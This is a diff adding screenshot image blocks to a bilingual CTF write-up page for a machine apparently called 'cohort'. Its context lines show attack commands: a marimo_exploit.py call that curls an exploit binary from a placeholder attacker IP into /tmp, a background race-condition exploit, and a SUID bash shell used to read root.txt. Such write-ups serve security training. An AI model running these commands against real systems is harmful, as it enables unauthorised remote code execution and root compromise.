@@ -326,7 +326,10 @@ if __name__ == "__main__":
       <pre><code>python3 -m http.server 8080</code></pre>
       <p data-en="We transfer the compiled binary to the victim's temporary directory:" data-es="Transferimos el binario compilado al directorio temporal de la víctima:">Transferimos el binario compilado al directorio temporal de la víctima:</p>
       <pre><code>python3 marimo_exploit.py "curl -s -o /tmp/exploit.bin http://&lt;IP_ATACANTE&gt;:8080/exploit.bin && chmod +x /tmp/exploit.bin && ls -la /tmp/exploit.bin"</code></pre>
-      
+      <div class="img-container">
+        <img src="/images/cohort/5.png" alt="Exploit transfer capture" />
+      </div>
+
       <p data-en="<strong>Background Execution (Race Condition):</strong> Because exploitation requires a runtime longer than a simple synchronous request to manipulate the race condition, we execute the exploit in the background redirecting output:" 
          data-es="<strong>Ejecución en segundo plano (Race Condition):</strong> Debido a que la explotación requiere un tiempo de ejecución superior al de una simple solicitud síncrona para manipular la condición de carrera (race condition), ejecutamos el exploit en segundo plano redirigiendo la salida:">
         <strong>Ejecución en segundo plano (Race Condition):</strong> Debido a que la explotación requiere un tiempo de ejecución superior al de una simple solicitud síncrona para manipular la condición de carrera (race condition), ejecutamos el exploit en segundo plano redirigiendo la salida:
@@ -338,12 +341,18 @@ if __name__ == "__main__":
         <strong>Verificación y obtención de privilegios de Superusuario:</strong> Tras unos segundos de espera, comprobamos los logs y la generación de la shell SUID resultante:
       </p>
       <pre><code>python3 marimo_exploit.py "cat /tmp/pk.log; echo ---; stat /tmp/.suid_bash 2>&1"</code></pre>
-      
+      <!-- Imagen 6.png -->
+      <div class="img-container">
+        <img src="/images/cohort/6.png" alt="Privilege escalation verification capture" />
+      </div>
       <p data-en="Once the process is successfully completed, we proceed to invoke bash with root privileges to read the final flag (root.txt). System fully compromised!" 
          data-es="Una vez completado el proceso con éxito, procedemos a invocar la bash con privilegios de root para leer la flag definitiva (root.txt). ¡Sistema comprometido por completo!">
         Una vez completado el proceso con éxito, procedemos a invocar la bash con privilegios de root para leer la flag definitiva (root.txt). ¡Sistema comprometido por completo!
       </p>
-      
+      <!-- Imagen 7.png -->
+      <div class="img-container">
+        <img src="/images/cohort/7.png" alt="Root flag capture" />
+      </div>
       <a href="/" class="back-btn" style="margin-top: 3rem;" data-en="← Back to home" data-es="← Volver al inicio">← Volver al inicio</a>
     </main>
 
